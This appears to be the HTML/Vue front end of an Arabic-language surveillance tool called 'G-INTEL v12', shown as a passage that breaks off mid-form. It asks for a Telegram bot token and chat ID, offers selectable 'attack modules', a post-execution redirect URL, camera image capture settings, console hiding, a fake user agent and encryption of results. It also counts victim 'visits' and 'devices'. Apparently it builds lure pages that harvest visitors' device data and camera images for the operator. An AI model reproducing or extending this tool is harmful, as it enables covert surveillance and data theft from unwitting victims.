<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>G-INTEL · السيادة المطلقة v12</title>
    
    <!-- ===================================================================== -->
    <!-- المكتبات الأساسية والإضافات المتطورة (40+ مكتبة) -->
    <!-- ===================================================================== -->
    
    <!-- Vue 3 - إطار العمل الرئيسي -->
    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
    
    <!-- Axios - للطلبات HTTP -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.2/axios.min.js"></script>
    
    <!-- UAParser - تحليل معلومات الجهاز -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
    
    <!-- TailwindCSS - التصميم السريع -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Font Awesome 6 - الأيقونات -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    
    <!-- GSAP - الرسوم المتحركة المتقدمة -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/Draggable.min.js"></script>
    
    <!-- Three.js - الرسوم ثلاثية الأبعاد -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    
    <!-- Chart.js - الرسوم البيانية -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.0/chart.umd.min.js"></script>
    
    <!-- CryptoJS - التشفير المتقدم -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    
    <!-- Animate.css - تأثيرات حركية -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    
    <!-- Moment.js - معالجة التواريخ -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.4/moment.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.4/locale/ar.min.js"></script>
    
    <!-- Lodash - أدوات مساعدة -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js"></script>
    
    <!-- QR Code - توليد رموز QR -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    
    <!-- jsPDF - توليد ملفات PDF -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    
    <!-- SheetJS - توليد ملفات Excel -->
    <script src="https://cdn.sheetjs.com/xlsx-0.20.1/package/dist/xlsx.full.min.js"></script>
    
    <!-- Compressor.js - ضغط الصور -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/compressorjs/1.2.1/compressor.min.js"></script>
    
    <!-- Clipboard.js - نسخ متقدم -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script>
    
    <!-- SortableJS - ترتيب العناصر -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.15.0/Sortable.min.js"></script>
    
    <!-- Marked - تحويل Markdown -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/9.1.5/marked.min.js"></script>
    
    <!-- DOMPurify - تنظيف HTML -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
    
    <!-- Socket.io - اتصال مباشر (اختياري) -->
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    
    <!-- i18next - تدويل متقدم -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/23.7.6/i18next.min.js"></script>
    
    <style>
        /* ===================================================================== */
        /* المتغيرات الأساسية والتصميم العام (400+ سطر CSS) */
        /* ===================================================================== */
        
        :root {
            --primary: #00aaff;
            --primary-dark: #0088cc;
            --primary-light: #33bbff;
            --secondary: #6c5ce7;
            --success: #00d68f;
            --warning: #ffaa00;
            --danger: #ff3b3b;
            --dark-bg: #0a0c15;
            --dark-surface: #121826;
            --dark-surface-2: #1a1f2f;
            --dark-border: #2a2f3f;
            --light-bg: #f0f4fa;
            --light-surface: #ffffff;
            --light-surface-2: #f5f7fc;
            --light-border: #d0d7e5;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', 'Cairo', -apple-system, BlinkMacSystemFont, sans-serif;
            overflow-x: hidden;
            transition: background-color 0.3s ease, color 0.3s ease;
        }

        body.dark-mode {
            background: var(--dark-bg);
            color: #e0e0e0;
        }

        body.light-mode {
            background: var(--light-bg);
            color: #1e1e2f;
        }

        /* ========== تأثيرات متقدمة ========== */
        .glass-deep {
            background: rgba(10, 20, 30, 0.3);
            backdrop-filter: blur(20px) saturate(200%);
            -webkit-backdrop-filter: blur(20px) saturate(200%);
            border: 1px solid rgba(0, 170, 255, 0.2);
            box-shadow: 0 30px 60px -20px #000, inset 0 0 30px rgba(0,170,255,0.1);
        }

        .glass-deep-light {
            background: rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(20px) saturate(200%);
            border: 1px solid rgba(0, 170, 255, 0.3);
            box-shadow: 0 30px 60px -20px rgba(0,0,0,0.2);
        }

        .neon-border {
            box-shadow: 0 0 20px var(--primary), inset 0 0 20px rgba(0,170,255,0.2);
        }

        .glow-text {
            text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary-dark);
        }

        .animate-float {
            animation: float 6s ease-in-out infinite;
        }

        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-15px); }
            100% { transform: translateY(0px); }
        }

        .animate-pulse-slow {
            animation: pulse 3s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        .grid-bg {
            background-image: 
                linear-gradient(rgba(0, 170, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 170, 255, 0.05) 1px, transparent 1px);
            background-size: 50px 50px;
            pointer-events: none;
        }

        /* ========== تخصيص شريط التمرير ========== */
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        ::-webkit-scrollbar-track {
            background: var(--dark-surface);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--primary-dark);
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary);
        }

        /* ========== تأثيرات على النصوص ========== */
        .gradient-text {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* ========== تأثيرات الحقول ========== */
        .neo-input {
            background: rgba(0, 0, 0, 0.6);
            border: 1.5px solid rgba(0, 170, 255, 0.3);
            border-radius: 40px;
            padding: 1rem 3rem 1rem 1.5rem;
            color: inherit;
            width: 100%;
            transition: all 0.3s ease;
        }

        .neo-input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(0, 170, 255, 0.3);
            outline: none;
        }

        body.light-mode .neo-input {
            background: rgba(255, 255, 255, 0.8);
            border-color: rgba(0, 170, 255, 0.5);
        }

        /* ========== تأثيرات الأزرار ========== */
        .btn-quantum {
            background: linear-gradient(145deg, var(--primary-dark), var(--primary));
            border: none;
            border-radius: 60px;
            padding: 1.2rem 2.5rem;
            font-weight: bold;
            color: white;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px -5px rgba(0,0,0,0.5);
        }

        .btn-quantum::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s ease;
        }

        .btn-quantum:hover::before {
            left: 100%;
        }

        .btn-quantum:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px -5px var(--primary);
        }

        .btn-quantum:active {
            transform: translateY(0);
        }

        /* ========== تأثيرات البطاقات ========== */
        .card-3d {
            transform-style: preserve-3d;
            perspective: 1200px;
            transition: transform 0.4s cubic-bezier(0.23, 1, 0.32, 1);
        }

        .card-3d:hover {
            transform: rotateX(2deg) rotateY(1deg);
        }

        /* ========== أنيميشن للتحميل ========== */
        .loader {
            width: 48px;
            height: 48px;
            border: 5px solid var(--primary);
            border-bottom-color: transparent;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
        }

        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* ========== تأثير الكتابة ========== */
        .typing-effect {
            overflow: hidden;
            border-left: 2px solid var(--primary);
            white-space: nowrap;
            animation: typing 3s steps(40, end), blink-caret 0.75s step-end infinite;
        }

        @keyframes typing {
            from { width: 0; }
            to { width: 100%; }
        }

        @keyframes blink-caret {
            from, to { border-color: transparent; }
            50% { border-color: var(--primary); }
        }
    </style>
</head>
<body :class="theme + '-mode'" class="transition-colors duration-300">
    <div id="app" v-cloak class="relative min-h-screen w-full overflow-hidden">
        
        <!-- ================================================================= -->
        <!-- الخلفية ثلاثية الأبعاد المتطورة (Three.js) -->
        <!-- ================================================================= -->
        <canvas id="bgCanvas" class="fixed top-0 left-0 w-full h-full -z-10"></canvas>
        
        <!-- طبقة الشبكة -->
        <div class="fixed top-0 left-0 w-full h-full grid-bg opacity-30 -z-5 pointer-events-none"></div>
        
        <!-- طبقة الجسيمات المتطايرة -->
        <div id="particles-container" class="fixed top-0 left-0 w-full h-full pointer-events-none -z-5"></div>

        <!-- ================================================================= -->
        <!-- شاشة التحميل المتطورة -->
        <!-- ================================================================= -->
        <transition enter-active-class="animate__animated animate__fadeOut" leave-active-class="animate__animated animate__fadeIn">
            <div v-if="loading" class="fixed inset-0 flex items-center justify-center bg-black/90 z-50">
                <div class="text-center">
                    <div class="loader mx-auto mb-6"></div>
                    <h2 class="text-3xl font-bold gradient-text mb-2">G-INTEL · السيادة المطلقة</h2>
                    <p class="text-gray-400 mb-4">{{ loadingMessage }}</p>
                    <div class="w-64 h-2 bg-gray-800 rounded-full mx-auto overflow-hidden">
                        <div class="h-full bg-gradient-to-r from-cyan-500 to-blue-600 transition-all duration-300" :style="{ width: loadingProgress + '%' }"></div>
                    </div>
                    <p class="text-xs text-gray-600 mt-2">v12.0.0 · {{ loadingStage }}</p>
                </div>
            </div>
        </transition>

        <!-- ================================================================= -->
        <!-- الواجهة الرئيسية (تظهر إذا لم يكن في وضع التنفيذ) -->
        <!-- ================================================================= -->
        <main v-if="!isExecuting" class="relative z-20 flex items-center justify-center min-h-screen p-4 md:p-6" dir="auto">
            <div class="w-full max-w-7xl">
                <!-- البطاقة الرئيسية العملاقة -->
                <div class="relative" :class="theme === 'dark' ? 'glass-deep' : 'glass-deep-light'" 
                     style="border-radius: 4rem; padding: 2.5rem;"
                     ref="mainCard"
                     @mousemove="handle3DMouseMove"
                     @mouseleave="reset3DCard">
                    
                    <!-- ========== الهيدر العملاق مع المؤشرات ========== -->
                    <div class="flex flex-wrap items-center justify-between gap-6 mb-8 pb-6 border-b" :class="theme === 'dark' ? 'border-cyan-800/30' : 'border-cyan-300/30'">
                        <div class="flex items-center gap-6">
                            <div class="relative">
                                <div class="w-20 h-20 bg-gradient-to-br from-cyan-600 to-blue-800 rounded-3xl shadow-2xl shadow-cyan-500/50 flex items-center justify-center animate-float">
                                    <i class="fas fa-microchip-ai text-5xl text-white"></i>
                                </div>
                                <div class="absolute -top-2 -right-2 w-6 h-6 bg-green-500 rounded-full border-2 border-white animate-pulse"></div>
                            </div>
                            <div>
                                <h1 class="text-5xl md:text-7xl font-black tracking-tighter">
                                    <span class="gradient-text">G-INTEL</span>
                                    <span class="text-2xl mr-2 text-cyan-400">v12</span>
                                </h1>
                                <div class="flex items-center gap-4 mt-3 flex-wrap">
                                    <div class="flex items-center gap-2">
                                        <span class="w-3 h-3 bg-green-400 rounded-full animate-pulse"></span>
                                        <span class="text-sm text-gray-400">{{ lang === 'ar' ? 'النظام الكمومي · جاهز' : 'Quantum System · Ready' }}</span>
                                    </div>
                                    <div class="flex gap-2">
                                        <span class="bg-cyan-900/50 px-3 py-1 rounded-full text-xs border border-cyan-500/50"><i class="fas fa-shield-alt ml-1"></i>Secure Core+</span>
                                        <span class="bg-purple-900/50 px-3 py-1 rounded-full text-xs border border-purple-500/50"><i class="fas fa-bolt ml-1"></i>Ultra</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- شريط التحكم العلوي -->
                        <div class="flex gap-3 items-center">
                            <button @click="toggleTheme" class="w-12 h-12 rounded-full border border-cyan-500/30 flex items-center justify-center hover:bg-cyan-900/30 transition group">
                                <i :class="theme === 'dark' ? 'fas fa-sun' : 'fas fa-moon'" class="text-cyan-400 text-xl group-hover:rotate-180 transition-transform duration-500"></i>
                            </button>
                            <button @click="toggleLanguage" class="px-5 py-2 rounded-full border border-cyan-500/30 text-sm hover:bg-cyan-900/30 transition flex items-center gap-2">
                                <i class="fas fa-globe text-cyan-400"></i>
                                <span>{{ lang === 'ar' ? 'English' : 'العربية' }}</span>
                            </button>
                            <button @click="toggleFullscreen" class="w-12 h-12 rounded-full border border-cyan-500/30 flex items-center justify-center hover:bg-cyan-900/30 transition">
                                <i class="fas fa-expand text-cyan-400"></i>
                            </button>
                        </div>
                    </div>

                    <!-- ========== نظام التبويبات المتقدم مع أيقونات متحركة ========== -->
                    <div class="flex flex-wrap gap-2 mb-6 border-b pb-3 overflow-x-auto" :class="theme === 'dark' ? 'border-gray-800' : 'border-gray-300'">
                        <button v-for="(tab, idx) in tabs" :key="tab.id" @click="activeTab = tab.id" 
                                class="px-6 py-3 rounded-full text-sm transition-all duration-300 flex items-center gap-2 relative group"
                                :class="activeTab === tab.id ? 
                                        'bg-gradient-to-r from-cyan-600 to-blue-600 text-white shadow-lg shadow-cyan-500/50' : 
                                        (theme === 'dark' ? 'bg-black/30 text-gray-300 hover:bg-cyan-900/30' : 'bg-white/30 text-gray-700 hover:bg-cyan-100/50')">
                            <i :class="tab.icon" class="text-lg"></i>
                            <span>{{ tab.name[lang] }}</span>
                            <span v-if="getTabBadge(tab.id)" class="absolute -top-2 -right-2 w-5 h-5 bg-red-500 rounded-full text-xs flex items-center justify-center text-white">{{ getTabBadge(tab.id) }}</span>
                        </button>
                    </div>

                    <!-- ========== المحتوى الديناميكي للتبويبات ========== -->
                    
                    <!-- التبويب الرئيسي (الإعدادات الأساسية) -->
                    <div v-if="activeTab === 'main'" class="grid grid-cols-1 lg:grid-cols-3 gap-8">
                        <!-- العمود الأيمن: الإعدادات الأساسية -->
                        <div class="lg:col-span-2 space-y-6">
                            <!-- حقل التوكن مع تحقق متقدم -->
                            <div class="group">
                                <label class="flex items-center gap-2 text-sm mb-2 text-gray-400">
                                    <i class="fas fa-robot text-cyan-400"></i>
                                    {{ lang === 'ar' ? 'توكن البوت (BotFather)' : 'Bot Token (BotFather)' }}
                                    <span class="text-xs text-cyan-400" v-if="tokenValidation.status === 'valid'">✓ {{ lang==='ar'?'صالح':'Valid' }}</span>
                                    <span class="text-xs text-red-400" v-else-if="tokenValidation.status === 'invalid'">✗ {{ lang==='ar'?'غير صالح':'Invalid' }}</span>
                                </label>
                                <div class="relative">
                                    <i class="fas fa-key absolute right-5 top-1/2 -translate-y-1/2 text-cyan-400/70 z-10"></i>
                                    <input type="text" v-model="config.token" @input="validateTokenAdvanced" 
                                        class="neo-input"
                                        :class="{
                                            'border-green-500/50 shadow-lg shadow-green-500/20': tokenValidation.status === 'valid',
                                            'border-red-500/50 shadow-lg shadow-red-500/20': tokenValidation.status === 'invalid'
                                        }"
                                        :placeholder="lang === 'ar' ? 'أدخل توكن البوت' : 'Enter bot token'">
                                </div>
                                <div v-if="tokenValidation.message" class="text-xs mt-2 mr-3" :class="tokenValidation.status === 'valid' ? 'text-green-400' : 'text-red-400'">
                                    <i :class="tokenValidation.status === 'valid' ? 'fas fa-check-circle' : 'fas fa-exclamation-circle'" class="ml-1"></i>
                                    {{ tokenValidation.message }}
                                </div>
                            </div>

                            <!-- حقل معرف الدردشة مع اقتراحات -->
                            <div>
                                <label class="flex items-center gap-2 text-sm mb-2 text-gray-400">
                                    <i class="fas fa-id-card text-cyan-400"></i>
                                    {{ lang === 'ar' ? 'معرف الدردشة (Chat ID)' : 'Chat ID' }}
                                </label>
                                <div class="relative">
                                    <i class="fas fa-hashtag absolute right-5 top-1/2 -translate-y-1/2 text-cyan-400/70 z-10"></i>
                                    <input type="text" v-model="config.chatId" @input="validateChatId" 
                                        class="neo-input"
                                        :class="{'border-green-500/50': chatIdValid, 'border-red-500/50': chatIdValid === false}"
                                        :placeholder="lang === 'ar' ? 'مثال: -1001234567890' : 'Example: -1001234567890'">
                                </div>
                                <div class="flex gap-2 mt-2">
                                    <button @click="suggestChatId('me')" class="text-xs bg-black/30 px-3 py-1 rounded-full border border-cyan-500/30 hover:bg-cyan-900/30"><i class="fas fa-user ml-1"></i>@me</button>
                                    <button @click="suggestChatId('channel')" class="text-xs bg-black/30 px-3 py-1 rounded-full border border-cyan-500/30 hover:bg-cyan-900/30"><i class="fas fa-users ml-1"></i>{{ lang==='ar'?'قناة':'Channel' }}</button>
                                </div>
                            </div>

                            <!-- اختيار الوحدات المتعددة (مع بحث وتصنيف) -->
                            <div>
                                <label class="flex items-center gap-2 text-sm mb-2 text-gray-400">
                                    <i class="fas fa-puzzle-piece text-cyan-400"></i>
                                    {{ lang === 'ar' ? 'وحدات الهجوم (اختر ما تريد)' : 'Attack Modules (Select any)' }}
                                    <span class="text-xs bg-cyan-900/50 px-2 py-1 rounded-full">{{ selectedModules.length }}/{{ filteredModules.length }}</span>
                                </label>
                                
                                <!-- شريط بحث الوحدات -->
                                <div class="relative mb-3">
                                    <i class="fas fa-search absolute right-4 top-1/2 -translate-y-1/2 text-gray-500"></i>
                                    <input type="text" v-model="moduleSearch" class="w-full bg-black/40 border border-cyan-500/30 rounded-full py-2 pr-10 pl-4 text-sm" :placeholder="lang==='ar'?'ابحث عن وحدة...':'Search module...'">
                                </div>

                                <!-- تصنيف الوحدات -->
                                <div class="flex gap-2 mb-3 overflow-x-auto pb-2">
                                    <button v-for="cat in moduleCategories" @click="selectedCategory = cat.id" 
                                            class="px-3 py-1 rounded-full text-xs whitespace-nowrap"
                                            :class="selectedCategory === cat.id ? 'bg-cyan-600 text-white' : 'bg-black/30 hover:bg-cyan-900/30'">
                                        <i :class="cat.icon" class="ml-1"></i>{{ cat.name[lang] }}
                                    </button>
                                </div>

                                <!-- شبكة الوحدات -->
                                <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2 max-h-96 overflow-y-auto p-2">
                                    <div v-for="mod in filteredModules" :key="mod.id" 
                                         @click="toggleModule(mod.id)"
                                         class="flex items-center gap-2 border rounded-xl p-3 cursor-pointer transition-all duration-300 hover:scale-105"
                                         :class="selectedModules.includes(mod.id) ? 
                                                'border-cyan-500 bg-gradient-to-br from-cyan-900/50 to-blue-900/50 shadow-lg shadow-cyan-500/30' : 
                                                (theme === 'dark' ? 'border-gray-700 bg-black/30' : 'border-gray-300 bg-white/30')">
                                        <i :class="mod.icon" class="text-xl" :class="selectedModules.includes(mod.id) ? 'text-cyan-300' : 'text-gray-500'"></i>
                                        <span class="text-sm">{{ mod.name[lang] }}</span>
                                        <i v-if="mod.premium" class="fas fa-crown text-yellow-500 text-xs mr-auto"></i>
                                    </div>
                                </div>
                            </div>

                            <!-- رابط التوجيه مع معاينة -->
                            <div>
                                <label class="flex items-center gap-2 text-sm mb-2 text-gray-400">
                                    <i class="fas fa-link text-cyan-400"></i>
                                    {{ lang === 'ar' ? 'رابط التوجيه (بعد التنفيذ)' : 'Redirect URL (after execution)' }}
                                </label>
                                <div class="flex gap-2">
                                    <div class="relative flex-1">
                                        <i class="fas fa-globe absolute right-4 top-1/2 -translate-y-1/2 text-cyan-400/70"></i>
                                        <input type="url" v-model="config.redirectUrl" class="neo-input" placeholder="https://example.com">
                                    </div>
                                    <button @click="testRedirectUrl" class="px-4 bg-black/30 border border-cyan-500/30 rounded-2xl hover:bg-cyan-900/30">
                                        <i class="fas fa-eye"></i>
                                    </button>
                                </div>
                            </div>
                        </div>

                        <!-- العمود الأيسر: معلومات وإحصائيات سريعة -->
                        <div class="space-y-6">
                            <!-- بطاقة معلومات الجهاز الحالي -->
                            <div class="bg-black/40 rounded-3xl p-5 border border-cyan-500/20">
                                <h3 class="font-bold mb-3 flex items-center gap-2 text-lg">
                                    <i class="fas fa-desktop text-cyan-400"></i>
                                    {{ lang === 'ar' ? 'معلومات الجهاز الحالي' : 'Current Device Info' }}
                                </h3>
                                <div class="space-y-2 text-sm">
                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'الجهاز':'Device' }}:</span> <span class="text-cyan-300">{{ deviceInfo.device || '?' }}</span></div>
                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'النظام':'OS' }}:</span> <span class="text-cyan-300">{{ deviceInfo.os || '?' }}</span></div>
                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'المتصفح':'Browser' }}:</span> <span class="text-cyan-300">{{ deviceInfo.browser || '?' }}</span></div>
                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'المعالج':'CPU' }}:</span> <span class="text-cyan-300">{{ deviceInfo.cpu || '?' }} {{ lang==='ar'?'أنوية':'cores' }}</span></div>
                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'الذاكرة':'RAM' }}:</span> <span class="text-cyan-300">{{ deviceInfo.ram || '?' }}</span></div>
                                </div>
                            </div>

                            <!-- بطاقة الإحصائيات -->
                            <div class="bg-black/40 rounded-3xl p-5 border border-cyan-500/20">
                                <h3 class="font-bold mb-3 flex items-center gap-2 text-lg">
                                    <i class="fas fa-chart-pie text-cyan-400"></i>
                                    {{ lang === 'ar' ? 'إحصائيات سريعة' : 'Quick Stats' }}
                                </h3>
                                <div class="space-y-2 text-sm">
                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'إجمالي الزيارات':'Total Visits' }}:</span> <span class="text-cyan-300">{{ stats.totalVisits }}</span></div>
                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'آخر تنفيذ':'Last Execution' }}:</span> <span class="text-cyan-300">{{ stats.lastExecution || '—' }}</span></div>
                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'الأجهزة المسجلة':'Devices' }}:</span> <span class="text-cyan-300">{{ stats.registeredDevices }}</span></div>
                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'نجاح/فشل':'Success/Fail' }}:</span> <span class="text-green-400">{{ stats.successCount }}</span>/<span class="text-red-400">{{ stats.failCount }}</span></div>
                                </div>
                            </div>

                            <!-- بطاقة مؤشر التقدم -->
                            <div class="bg-black/40 rounded-3xl p-5 border border-cyan-500/20">
                                <h3 class="font-bold mb-3 flex items-center gap-2 text-lg">
                                    <i class="fas fa-chart-line text-cyan-400"></i>
                                    {{ lang === 'ar' ? 'مستوى التقدم' : 'Progress Level' }}
                                </h3>
                                <div class="h-4 bg-gray-800 rounded-full overflow-hidden">
                                    <div class="h-full bg-gradient-to-l from-cyan-400 to-blue-600 transition-all duration-500" :style="{ width: overallProgress + '%' }"></div>
                                </div>
                                <div class="grid grid-cols-2 gap-2 mt-3 text-xs">
                                    <div><span class="text-gray-400">{{ lang==='ar'?'التوكن':'Token' }}:</span> <span :class="config.token ? 'text-green-400' : 'text-red-400'">{{ config.token ? '✓' : '✗' }}</span></div>
                                    <div><span class="text-gray-400">{{ lang==='ar'?'المعرف':'Chat ID' }}:</span> <span :class="config.chatId ? 'text-green-400' : 'text-red-400'">{{ config.chatId ? '✓' : '✗' }}</span></div>
                                    <div><span class="text-gray-400">{{ lang==='ar'?'الوحدات':'Modules' }}:</span> <span :class="selectedModules.length ? 'text-green-400' : 'text-red-400'">{{ selectedModules.length ? '✓' : '✗' }}</span></div>
                                    <div><span class="text-gray-400">{{ lang==='ar'?'الرابط':'URL' }}:</span> <span :class="config.redirectUrl ? 'text-green-400' : 'text-red-400'">{{ config.redirectUrl ? '✓' : '✗' }}</span></div>
                                </div>
                            </div>

                            <!-- بطاقة التشفير -->
                            <div class="bg-black/40 rounded-3xl p-5 border border-cyan-500/20">
                                <h3 class="font-bold mb-3 flex items-center gap-2 text-lg">
                                    <i class="fas fa-lock text-cyan-400"></i>
                                    {{ lang === 'ar' ? 'حالة التشفير' : 'Encryption Status' }}
                                </h3>
                                <div class="space-y-2">
                                    <div class="flex justify-between"><span class="text-gray-400">AES-256:</span> <span :class="security.encrypt ? 'text-green-400' : 'text-gray-500'">{{ security.encrypt ? 'مفعل' : 'غير مفعل' }}</span></div>
                                    <div class="flex justify-between"><span class="text-gray-400">Base64:</span> <span class="text-green-400">مفعل دائماً</span></div>
                                    <div class="flex justify-between"><span class="text-gray-400">إخفاء الكونسول:</span> <span :class="security.hideConsole ? 'text-green-400' : 'text-gray-500'">{{ security.hideConsole ? 'مفعل' : 'غير مفعل' }}</span></div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- التبويب المتقدم (إعدادات متطورة) -->
                    <div v-if="activeTab === 'advanced'" class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <!-- قسم الحماية -->
                        <div class="bg-black/40 rounded-3xl p-6 border border-cyan-500/20">
                            <h3 class="font-bold text-lg mb-4 flex items-center gap-2"><i class="fas fa-shield-alt text-cyan-400"></i> {{ lang==='ar'?'الحماية والتشفير':'Security & Encryption' }}</h3>
                            <div class="space-y-4">
                                <div class="flex items-center justify-between">
                                    <span class="text-sm">{{ lang==='ar'?'تشفير إضافي (AES-256)':'Extra AES-256 Encryption' }}</span>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" v-model="security.encrypt" class="sr-only peer">
                                        <div class="w-11 h-6 bg-gray-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:right-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-cyan-600"></div>
                                    </label>
                                </div>
                                <div v-if="security.encrypt">
                                    <input type="password" v-model="security.key" class="w-full bg-black/60 border border-cyan-500/30 rounded-xl py-2 px-3 text-sm" :placeholder="lang==='ar'?'مفتاح التشفير (16 حرف على الأقل)':'Encryption key (min 16 chars)'">
                                    <div class="flex items-center gap-2 mt-2">
                                        <span class="text-xs text-gray-400">{{ lang==='ar'?'قوة المفتاح:':'Key strength:' }}</span>
                                        <span :class="getKeyStrengthColor">{{ getKeyStrengthText }}</span>
                                    </div>
                                </div>
                                <div class="flex items-center justify-between">
                                    <span class="text-sm">{{ lang==='ar'?'إخفاء وحدة التحكم':'Hide Console' }}</span>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" v-model="security.hideConsole" class="sr-only peer">
                                        <div class="w-11 h-6 bg-gray-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:right-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-cyan-600"></div>
                                    </label>
                                </div>
                                <div class="flex items-center justify-between">
                                    <span class="text-sm">{{ lang==='ar'?'وكيل مزيف (Fake UA)':'Fake User Agent' }}</span>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" v-model="security.fakeUA" class="sr-only peer">
                                        <div class="w-11 h-6 bg-gray-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:right-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-cyan-600"></div>
                                    </label>
                                </div>
                                <div class="flex items-center justify-between">
                                    <span class="text-sm">{{ lang==='ar'?'منع النسخ':'Prevent Copy' }}</span>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" v-model="security.preventCopy" class="sr-only peer">
                                        <div class="w-11 h-6 bg-gray-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:right-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-cyan-600"></div>
                                    </label>
                                </div>
                            </div>
                        </div>

                        <!-- قسم التأخير والجودة -->
                        <div class="bg-black/40 rounded-3xl p-6 border border-cyan-500/20">
                            <h3 class="font-bold text-lg mb-4 flex items-center gap-2"><i class="fas fa-clock text-cyan-400"></i> {{ lang==='ar'?'تأخير وجودة':'Delay & Quality' }}</h3>
                            <div class="space-y-4">
                                <div>
                                    <label class="text-sm block mb-1">{{ lang==='ar'?'تأخير التوجيه (ثواني)':'Redirect Delay (seconds)' }}</label>
                                    <input type="range" v-model="extra.delay" min="0" max="30" step="0.5" class="w-full">
                                    <div class="flex justify-between text-xs">
                                        <span>0</span>
                                        <span class="text-cyan-400">{{ extra.delay }} ث</span>
                                        <span>30</span>
                                    </div>
                                </div>
                                <div>
                                    <label class="text-sm block mb-1">{{ lang==='ar'?'عدد محاولات الإرسال':'Max Retries' }}</label>
                                    <input type="range" v-model="extra.retries" min="1" max="10" class="w-full">
                                    <div class="flex justify-between text-xs">
                                        <span>1</span>
                                        <span class="text-cyan-400">{{ extra.retries }}</span>
                                        <span>10</span>
                                    </div>
                                </div>
                                <div>
                                    <label class="text-sm block mb-1">{{ lang==='ar'?'جودة الصورة (كاميرا)':'Image Quality (Camera)' }}</label>
